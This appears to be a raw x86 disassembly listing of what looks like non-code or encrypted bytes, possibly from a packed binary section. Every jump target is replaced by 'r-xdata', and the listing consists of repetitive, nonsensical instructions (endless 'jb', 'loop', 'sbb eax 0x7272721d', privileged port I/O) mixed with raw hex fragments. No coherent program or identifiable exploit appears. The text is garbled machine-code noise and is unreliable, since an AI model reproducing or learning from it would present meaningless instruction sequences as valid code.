jb r-xdata
jb r-xdata
popad
push cs
mov cl 0xb5
sbb eax 0xe2e25674
je r-xdata
imul edi [ edi + 0x135b0b1e ] 0x1d
sbb eax 0x72727272
imul esp [ esi - 0x1597193a ] 0x21fd0ba2
sbb eax 0xedaa721d
push ebp
loop r-xdata
sbb eax 0x7272721d
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xb
mov [ esi ] ss
push edx
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
loop r-xdata
push cs
mov cl 0x1d
test [ esi - 0x1e ] 0x120be2e2
aaa
jb r-xdata
loop r-xdata
sbb eax 0xa725721d
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
insb
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
mov ebx 0xed2267bd
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
inc edx
jb r-xdata
jb r-xdata
leave
shl [ edx ] 0x1
test [ ebx - 0x59 ] ch
sbb al 0x6f
cmpsd [ esi ] [ edi ]
adc dh [ edx + 0xaeaa769 ]
mov [ edi - 0x58947b46 ] al
sbb cl [ eax + 0x6b84ba9a ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ eax + 0x6b84ba87 ] cl
cmpsd [ esi ] [ edi ]
push ds
xchg [ edx + 0x1aa76b84 ] edi
mov [ edx - 0x58947b46 ] bl
inc eax
adc ebx [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ ebp + 0xb82a46b ] 0x79
jb r-xdata
imul esp [ edi + 0xb22d136 ] 0x58
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or [ ebx ] 0x61
jb r-xdata
and ch al
or ecx [ ebx + edx ]
push ss
mov edx 0x14a76b84
mov [ eax + 0x1d3d610b ] al
mov edx 0x6b849488
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
push ds
mov [ 0xb1ea76b ] al
and bl [ eax ]
scasd [ edi ]
push ds
mov bl 0xb2
mov al ah
mov bh [ edi + ecx * 4 ]
xor eax 0xe9d80b41
loop r-xdata
sub ebx [ 0x1e87611d ]
or ebx [ 0xffffffffbe66ed1d ]
jb r-xdata
sbb eax 0xbe66ed1d
and al 0xb
jb r-xdata
jb r-xdata
jb r-xdata
push cs
loop r-xdata
mov ecx 0xb469212b
outsd
loop r-xdata
or ebx [ esi + 0xf ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
pop edx
sbb eax 0xc69e611d
in ax 0xe2
loop r-xdata
test eax 0x58100b6e
sbb eax 0x69b7721d
shl [ edx ] 0x1
fistp [ edi + 0x309d0b1e ]
sbb eax 0x7272721d
stosd [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov cl 0xb4
mov ch 0xa
pop es
or esp edi
sbb [ 0x7272721d ] bl
or ecx [ ebx ]
loope r-xdata
jb r-xdata
out dx al
mov ch 0xbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x6f72721d
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1ea7611e ] 0xffffffe6
or eax ecx
retn 0xe2e2
mov dl 0x1d
mov ah 0xce
or esi [ ecx + 0x3f ]
jb r-xdata
sbb eax 0x67bdbbbb
imul esi [ edi + 0x348b0a46 ] 0x1d
jb r-xdata
loopne r-xdata
loop r-xdata
jb r-xdata
out 0xa1 al
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
nop [ 0x1d100f0b ] ebx
sbb eax 0x72727272
jb r-xdata
push esp
in eax 0xb2
arpl [ 0xffffffffe2e2e228 ] sp
outsd
add eax 0xb21d1d10
mov cl 0xb1
mov ch ah
mov cl 0x1d
jne r-xdata
and cl [ bp + di ]
jb r-xdata
mov [ edx ] esp
call 0x1d58be9a
sbb eax 0x12d10a72
0x8816a76f 0xbe2
jb r-xdata
mov dl 0xb4
jb r-xdata
jb r-xdata
sbb eax 0x88b4b4b2
jb r-xdata
jb r-xdata
or esi edx
in al dx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x2bbe66ed
sbb eax 0x1e87611d
mov cl ah
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor bl [ edi + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x1d
je r-xdata
sbb eax 0x99638a1d
jb r-xdata
push ebp
or edi edx
or bh [ edx + 0x6b848388 ]
cmpsd [ esi ] [ edi ]
or [ ebx ] cl
cli
cmp [ edx + 0x6b848688 ] 0xa7
imul esp [ edx + ecx ] 0x1d1d2e17
mov ebx 0xdac6a66f
imul esp [ edi + 0x2a890b06 ] 0x1d
sbb eax 0xb80bf51d
pop edi
sbb eax 0x7272721d
jb r-xdata
mov ch 0x6b
jb r-xdata
mov ch 0xb2
loop r-xdata
jb r-xdata
push esp
loop r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
0x6fe2e2e0 0x1a67
jb r-xdata
loop r-xdata
push cs
or eax [ ecx + 0x72e2e2fe ]
in eax dx
jl r-xdata
imul edx [ edx ] 0x11d939d1
popad
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
int3
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ edx + 0x721d1d38 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
mov dl ah
or eax [ edx ]
popad
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edi - 0x58945de2 ] 0x18220b1e
shl [ eax ] cl
pop bx
add ebx [ 0x24170b1d ]
sbb eax 0xd2a46b1d
or bh [ ecx - 0x75e2e2ce ]
sbb eax 0x24170b1d
jb r-xdata
jb r-xdata
jb r-xdata
or ebx eax
jmp 0x72b8b4cf
loop r-xdata
jb r-xdata
mov cl 0x1d
xchg esi eax
ffreep st1
mov ah [ ebx - 0x67 ]
jb r-xdata
imul ebx [ edi + 0x59f60b1a ] 0x1d
movsb [ edi ] [ esi ]
jb r-xdata
xor al 0x1d
mov ah 0xb5
or al [ edi ]
mov dl [ ebx ]
jb r-xdata
sbb al 0xb
jb r-xdata
or ecx [ es : eax + 0x1a ]
sbb bl [ bx ]
sbb eax 0xc2320b1d
loop r-xdata
push ds
sbb eax 0x2267aeb4
or edx [ ebx ]
adc ebx [ 0xffffffffa725721d ]
outsd
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
insb
mov [ edx - 0x20 ] 0xe2
loop r-xdata
or esp [ edx - 0x20 ]
leave
jb r-xdata
jb r-xdata
jb r-xdata
mov eax [ 0x18930bf6 ]
jb r-xdata
jb r-xdata
mov esi [ ebx - 0x424444e3 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
0x1d0f510a 0xb1d
loop r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x2267bdbb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
dec edx
mov ah 0x6f
mov bh 0x69
push cs
or ecx [ esi + 0x7272e2e2 ]
jb r-xdata
arpl [ ecx + 0xbb5c1df ] bx
or edx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x52741d1d
xchg [ ebx + ebp * 2 - 0x7745f559 ] al
add [ ebx + ebp * 2 - 0x5f4f759 ] 0x55
loop r-xdata
je r-xdata
jb r-xdata
cdq
jb r-xdata
or bh [ eax ]
xor eax 0x2f8a1d1d
mul dl
loop r-xdata
fld [ edi - 0x5b9b1212 ]
mov dh 0x67
jb r-xdata
dec [ ebx + 0x26541da2 ]
jb r-xdata
push esp
jb r-xdata
sahf
jb r-xdata
sbb eax 0xb51d3e97
jb r-xdata
cmpsd [ esi ] [ edi ]
mov ah 0xae
and cl [ bp + di ]
jb r-xdata
jb r-xdata
adc [ edx + 0x1d0c110b ] bh
sbb eax 0x72727272
jb r-xdata
mov bh al
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
sbb eax 0x9269721d
fsubrp st1
adc ch ch
push ebp
mov dl 0x69
and al 0xa
jb r-xdata
test [ ecx - 0x26 ] ah
sbb eax 0xaa76f1d
jb r-xdata
jb r-xdata
sbb eax 0xbdbbbb1d
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
mov ebp 0x67ed2267
jb r-xdata
jb r-xdata
loop r-xdata
rol ebx 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
outsd
scasd [ edi ]
or esi eax
push eax
sbb eax 0x7272721d
jb r-xdata
inc [ eax ]
sbb eax 0x66ed721d
lds ebp [ esi ]
sbb eax 0x36af6f1d
or esi eax
imul ebx [ edi + 0xfe0b74 ] 0x1d
sbb eax 0xc566ed72
sbb eax 0x36af6f1d
imul ebx [ edi + 0x36 ] 0x1f
sbb eax 0xf2b41d1d
or ebp eax
push cs
sbb eax 0x6f1b691d
outsd
sub bl [ edi ]
pop esi
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
sbb eax 0xbb1721d
pop ss
loop r-xdata
jb r-xdata
shl [ ebp + 0x1d30d20b ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ esi ]
and ch ch
jb r-xdata
test eax 0x72e2e2ff
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
out 0xe3 al
loop r-xdata
sbb eax 0x14d1b21d
jb r-xdata
0x26a79b22
jb r-xdata
movsb [ edi ] [ esi ]
mul [ ecx + 0x26 ]
out dx al
test [ ebx - 0x59 ] ch
or ebp [ edi - 0x3e ]
loop r-xdata
in ax 0xc7
and ch ch
jb r-xdata
sbb eax 0xb414d1b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ esi - 0x1e ]
loop r-xdata
je r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov dl dh
jb r-xdata
jb r-xdata
outsd
jb r-xdata
mov [ edx - 0x1d153ff5 ] dl
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ ss : edx ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x5c
sbb eax 0x7272721d
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
sbb eax 0xdf99638a
jb r-xdata
mov dl [ edx + 0x5c ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x3e0a0a1d
sbb eax 0x17bb0b1d
imul ebx [ ebx ] 0x1f2a6f6f
jb r-xdata
sbb eax 0xe2e24e74
or edx edx
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x72212bb9
jb r-xdata
adc edi edi
loop r-xdata
jb r-xdata
jb r-xdata
or ebx [ 0x72e2e2c7 ]
out dx al
adc eax 0xa222f93a
sub esp [ ecx ]
jb r-xdata
jb r-xdata
or ecx esp
adc al 0x1d
sbb eax 0x3b9d0a72
sbb eax 0x2267aeb5
or esp [ ebx + 0x35 ]
sbb eax 0x7272721d
mov ah dh
jecxz r-xdata
mov dl 0xd1
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
rcl [ esp + esi * 4 ] 0x1
jb r-xdata
jb r-xdata
pop esi
jb r-xdata
jb r-xdata
loop r-xdata
imul esi [ edi + 0x3e ] 0x6b1d1d1f
jbe r-xdata
and cl [ bp + di ]
arpl [ 0x72721d1d ] si
jb r-xdata
scasb [ edi ]
loop r-xdata
loop r-xdata
loop r-xdata
outsd
imul esp [ edi - 0x3d7745fa ] 0xffffff84
imul esp [ edi - 0x2f7745fc ] 0xffffff84
imul esp [ edi + 0xb4c0b0a ] 0x1d
sbb eax 0xfb0b7272
out 0xe2 eax
loop r-xdata
ja r-xdata
adc al 0xb4
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
jb r-xdata
bound eax [ esi - 0x1e ]
loop r-xdata
and ch dl
mov dl 0x1d
xchg edi eax
push es
sbb eax 0xac69feb5
0x7e0b
jb r-xdata
or cl [ ebx + 0x30 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x721d1d18 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x8a
jb r-xdata
jb r-xdata
fstp [ esi + 0x66edf6c6 ]
0x8ae2e2e2 0xd87a
mov ah 0xa
jb r-xdata
jb r-xdata
retn 0xe2e2
and cl [ ebx ]
jb r-xdata
or ebx [ eax - 0x3e ]
shl [ edx ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
adc al 0xba
mov [ esp + eax * 4 - 0x45e55895 ] al
mov ah cl
test [ ebx - 0x59 ] ch
sbb [ edx + 0x1d1dca0b ] bh
sbb eax 0x32a76b84
or ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
insd
adc [ 0x7272721d ] ebx
mov cl 0xb
jb r-xdata
pop esp
jb r-xdata
loop r-xdata
mov esi 0x900af6c6
sub ebx [ 0xb1dd11d ]
jb r-xdata
sbb eax 0x9e0a96b4
pop edi
sbb eax 0xed22671d
in eax 0xe2
je r-xdata
xor cl [ ebx ]
jne r-xdata
sbb eax 0x55edaa72
or esp [ ecx - 0x18 ]
loop r-xdata
pop ds
and cl [ bp + di ]
cli
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x5e64691d
in al 0x3c
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x1ea72572
popad
scasd [ edi ]
push ds
or ebx [ eax + 0xb1d1d12 ]
cmp eax 0x72721d1d
mov dl 0xa
imul ebx [ ebx + ecx ] 0x1d1d0454
jb r-xdata
or ebp [ ecx + 0x72e2e2ff ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9d0a721d
jb r-xdata
jb r-xdata
outsd
or ecx [ eax + 0x1a ]
call 0x26a79b22
arpl [ esi ] cx
jb r-xdata
jb r-xdata
loop r-xdata
in eax 0xc7
jb r-xdata
jb r-xdata
jb r-xdata
cli
int3
mov ah 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xe2e2e228
jb r-xdata
jb r-xdata
outsd
cmp bh cl
and ah [ edx + 0x7272212b ]
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xea766b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x7272212b ] al
popad
jb r-xdata
xchg edi eax
sbb ch [ ebx - 0x59 ]
xor cl [ ebx ]
inc eax
0xe2e2
xor [ 0xffffffffee26611d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0xb4
or ecx ebp
mul dl
loop r-xdata
sbb bl [ 0xaa76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
dec ebx
jb r-xdata
jb r-xdata
pop eax
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cli
in eax dx
xor dl [ fs : ecx + 0x1d ]
sbb eax 0xf2c68661
jb r-xdata
sbb eax 0x2267aeb2
in eax dx
insb
sub ebx [ 0x526f6f1d ]
pop ds
sbb eax 0x20390a1d
sbb eax 0x169f6f1d
outsd
outsb
pop ds
sbb eax 0x9f6b841d
je r-xdata
outsd
cmpsd [ esi ] [ edi ]
test [ cs : ebx - 0x69 ] ch
dec esi
imul edx [ edi + 0x6b84b2ea ] 0x6fb44aaf
jb r-xdata
jb r-xdata
in eax dx
and bl bl
lahf
push ds
or ebx [ ebp + 0x721d1d30 ]
jb r-xdata
jb r-xdata
or ebp [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xe2e24e74
cmpsd [ esi ] [ edi ]
push ds
push 0xea6aeeaf
sbb eax 0x8aee2661
loop r-xdata
mov cl 0x1d
loop r-xdata
in al dx
loop r-xdata
jb r-xdata
and cl [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
jmp edx
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
dec esi
loop r-xdata
sbb eax 0x2267b2b5
or esp [ esi - 0x20 ]
loop r-xdata
mov bh 0x69
jb r-xdata
jb r-xdata
or esi [ eax - 0x4 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc [ ebx ] cl
jb r-xdata
jb r-xdata
sahf
mov ch 0xae
outsd
jb r-xdata
popad
in eax dx
pushad
push esi
out 0xe2 al
loop r-xdata
loop r-xdata
jb r-xdata
in eax dx
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xb20aa76f
mov ah 0xb
int 0xf6
jb r-xdata
jb r-xdata
mov esp [ edx - 0x1dd9abe3 ]
jb r-xdata
in eax dx
push esp
in eax 0xb
out dx eax
or eax 0x69721d1d
and ebp ebp
xor [ 0x22611d1d ] bl
loopne r-xdata
sbb eax 0xee26611d
sbb eax 0x1d362a0b
imul esp [ edi + 0x34090a1e ] 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fsubrp st1
in eax dx
aaa
pop esi
sbb eax 0xc69e611d
mul bl
in eax dx
sub [ esi + 0x1d ] bl
sbb eax 0x1d38b10b
sbb eax 0x1d130a0a
sbb eax 0x19126f6f
sbb eax 0x23880a1d
mov dl 0x6f
jb r-xdata
imul esi [ edi - 0x47c49660 ] 0xb
lahf
or ebx [ 0xffffffff8495881d ]
sbb eax 0x721d1d39
jb r-xdata
movsb [ edi ] [ esi ]
sbb bl [ 0x7272721d ]
jb r-xdata
or al [ eax + 0x9 ]
sbb eax 0xed22671d
clc
sbb ebx [ 0x3a9f6f1d ]
outsd
outsd
push edx
pop ds
sbb eax 0xe1730b1d
loop r-xdata
outsd
lahf
push ss
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or esp [ edx ]
sbb [ 0x7272721d ] bl
sub ecx [ bp + di ]
mov ch 0xb
jb r-xdata
ror [ eax - 0x79774580 ] cl
test [ ebx - 0x59 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or cl [ edx ]
sbb eax 0x17bb0b1d
loop r-xdata
and al 0x1d
sbb eax 0xad2a46b
mov ecx 0x8a1d1d32
loop r-xdata
sbb eax 0xe2e26275
loop r-xdata
sbb eax 0xe2e24e74
jb r-xdata
aaa
push ds
jb r-xdata
and ah dl
loop r-xdata
imul esp [ esi + ebx * 2 - 0x1e ] 0x6c69e2e2
mov esi 0xe2fe810b
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x12980b1e ] 0x650b1d1d
cmp eax 0x72721d1d
jb r-xdata
jbe r-xdata
cmp ebx [ 0xfffffffffa26611d ]
popfd
jb r-xdata
or esp [ ecx ]
or bl [ 0xffffffff9a0bb71d ]
in eax dx
loop r-xdata
cld
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
leave
jb r-xdata
sbb [ 0xffffffffe3750a1d ] ebx
adc bl [ ecx ]
jb r-xdata
mov esp 0x84c08821
jb r-xdata
jb r-xdata
mov [ ecx + 0x3aa76b84 ] dl
mov edx 0x930b8188
in eax dx
push ebp
popad
and esp eax
shl [ edx ] 0x1
outsd
mov eax 0xefd40b32
loop r-xdata
in al 0xe2
test [ ebx - 0xa ] ch
xchg ebx eax
movsb [ edi ] [ esi ]
fst [ edx ]
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edi + 0xb1d1d33 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ch
0xffffe2e2 0x8ae2
and esp eax
or cl [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
or dh [ edx - 0x932f44c ]
imul esp [ edx + 0x46 ] 0x61e2e2e2
xchg edx eax
or eax eax
0x7272e2e2 0x971d
sbb eax 0xe2e22654
jb r-xdata
and bl [ 0x69721d1d ]
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0xb
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ 0xffffffffa76b841d ] ebx
or cl [ ebx ]
imul ebx [ ecx + 0x1d ] 0xb2941d1d
test al 0x69
cmp cl [ ebx ]
jb r-xdata
imul edi [ edi - 0x48947bfa ] 0xffffffa0
jb r-xdata
loop r-xdata
mov edx 0x1d391d0b
sbb eax 0x72727272
or bh [ ecx ]
and [ 0x169f6f1d ] bl
mov eax [ 0x3264edfa ]
push ecx
sbb eax 0xc686611d
loop r-xdata
mov bh 0xb
popad
call 0x72b8b4ed
jb r-xdata
outsd
push edx
pop ds
sbb eax 0xa769b21d
0xb21de288 0x67ae
shl [ edx ] 0x1
jb r-xdata
sbb eax 0x7272721d
mov cl 0x1d
xchg esi eax
and eax 0xe3e2e0e2
loop r-xdata
dec esi
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmp esi 0x7272e2e2
mov [ 0x1d18e70b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xfa26611d
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xbe6881d
scasb [ edi ]
add eax 0x84721d1d
imul esp [ edi - 0x697745fa ] 0xb
fsubr st5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ ebp + 0x611d1d3b ]
jb r-xdata
sbb eax 0xe3750a1d
imul esp [ edi - 0x494ae2ca ] 0x67
jb r-xdata
jb r-xdata
xchg edi eax
sbb eax 0xbf6b1297
jb r-xdata
jb r-xdata
loop r-xdata
mov ebx 0x62e36986
0x1c0be2e0 0x1d37
sbb eax 0xd1727272
xchg ebp eax
jb r-xdata
sbb eax 0xce0bea97
cmc
loop r-xdata
in eax dx
mov al [ 0x1d1d1d3f ]
xchg edi eax
out dx al
imul ecx [ esi ] 0x1e8761b3
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x2267b6b5
sbb eax 0x66ed721d
xor ebx [ 0x1bc0b1d ]
jb r-xdata
rol bx 0xe2
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]

loop r-xdata
jb r-xdata
or [ ebx + 0x362a0b1d ] esi
jb r-xdata
lahf
push ds
jb r-xdata
imul ebx [ edi - 0x5ef44de2 ] 0x3d
0x691d1d05 0xb35
sbb eax 0x1a69e6b4
mov [ esi + 0x19180bb5 ] al
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
or [ ebx ] cl
mov cl 0x2a
sbb eax 0x7272721d
jb r-xdata
dec edx
adc eax 0xb41d1d1d
0xcea155ed 0x6784
mov dl 0xb
jb r-xdata
or [ eax ] 0x67bb1d1d
jb r-xdata
jmp 0x7262f137
push es
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
test [ ebx - 0x59 ] ch
in eax dx
pop si
out dx eax
loop r-xdata
jb r-xdata
xchg edi eax
or ch [ ebx - 0x59 ]
sbb bl [ 0x2267b6b5 ]
in eax dx
xor ax 0xe2e2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe25e6469
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah 0x69
adc ch ch
jb r-xdata
jpe r-xdata
sub eax 0x72721d1d
mov eax 0x88bb9488
test [ ecx + 0x20 ] ebp
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or eax esp
jb r-xdata
in al 0xb5
mul [ es : edi + 0x22 ]
sub dh [ ebp - 0x1d0506f6 ]
loop r-xdata
adc ch [ ebx - 0x41 ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ch [ ebx - 0x59 ]
jb r-xdata
enter 0xe2c4 0xe2
sar [ ebx + 0x69e36986 ] cl
mov [ 0x1ea76bea ] al
or edi esi
in eax dx
loop r-xdata
jb r-xdata
sbb eax 0x1d01bc0b
jb r-xdata
int3
imul esp [ ecx + 0x18930bf6 ] 0x72721d1d
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
and esi [ ebx ]
sbb ah [ ecx ]
jb r-xdata
and dl [ 0x1d1d ]
outsd
movsd [ edi ] [ esi ]
jecxz r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9f6b841d
sbb eax 0x362a0b1d
jb r-xdata
jb r-xdata
loope r-xdata
and eax 0xafb40aa7
test eax 0xbf80bb4
sbb eax 0xf888b11d
mov cl 0xb
push edx
xor al 0x1d
sbb eax 0x3ebf6b84
mov ecx 0x6b848188
mov edi 0x8438693c
imul edi [ edi - 0x2b7746fe ] 0xffffff84
imul ebx [ edi - 0x297742f6 ] 0xffffff84
imul esi [ edi - 0x60947b32 ] 0x8
mov ebp 0x1d5e130b
popad
lahf
out dx al
loop r-xdata
fistp [ esi + 0x66edd2c6 ]
in eax dx
jb r-xdata
mov [ 0xbe2e2ea ] al
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
jb r-xdata
imul edi [ ebx ] 0x30e90bb8
sbb eax 0xb972721d
mov bh 0xa0
jb r-xdata
mov al [ 0xbb83b69 ]
mov edi 0xb76b8406
jb r-xdata
push 0xffffffb2
mov cl 0xb1
mov dh ah
mov cl 0xb
mov [ edi ] dh
or dl [ esi + 0x671d1d02 ]
and cl [ ebx ]
daa
adc bl [ 0x7272721d ]
mov dh ah
or edi [ edi ]
adc bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx - 0x1e ] 0x228be2e2
pop esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45ed5895 ] al
mov [ ebx + 0x1d335f0b ] cl
sbb eax 0x72727272
jb r-xdata
cmp al [ ebx + ebp * 2 + 0x3b69eebf ]
test [ ebx - 0x41 ] ch
in al dx
or ebp [ ebx - 0xb ]
loop r-xdata
in eax dx
push esp
sbb cl cl
and eax 0xe2f75b0b
loop r-xdata
imul edx [ edx ] 0xb5e454ed
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
imul esp [ ss : ebx ] 0x34a76b84
mov edx 0x6b849188
cmpsd [ esi ] [ edi ]
cmp bh [ edx - 0x6cf47e78 ]
mov [ ebx + edi * 4 + 0x20698588 ] dl
sbb eax 0x67fa2661
jb r-xdata
jb r-xdata
mov edi 0xf90ab52a
jb r-xdata
jb r-xdata
jb r-xdata
push ss
rcr [ 0x65f9669 ] 0x1
cmpsd [ esi ] [ edi ]
in eax dx
sbb ax 0xe2f4
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x721d1d01
jb r-xdata
jb r-xdata
sub dh [ esi ]
jb r-xdata
mov [ 0xffffffffe226541d ] al
jb r-xdata
jb r-xdata
popad
cmp al 0xb
or ebp [ edx ]
jb r-xdata
jb r-xdata
sbb eax 0xb35691d
out 0x56 eax
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
arpl [ esi ] cx
int1
and [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x17270b1d
jb r-xdata
aad 0xea
loop r-xdata
mov ebx 0x66ed2267
mov [ 0xbe2e2ea ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb bl [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
arpl [ 0xffffffffe2e2e228 ] sp
jb r-xdata
mov ch 0xb
mov dl 0xa
xchg ebx eax
das
sbb eax 0xee971d1d
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push esp
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
or ebx eax
in eax dx
popad
cli
loop r-xdata
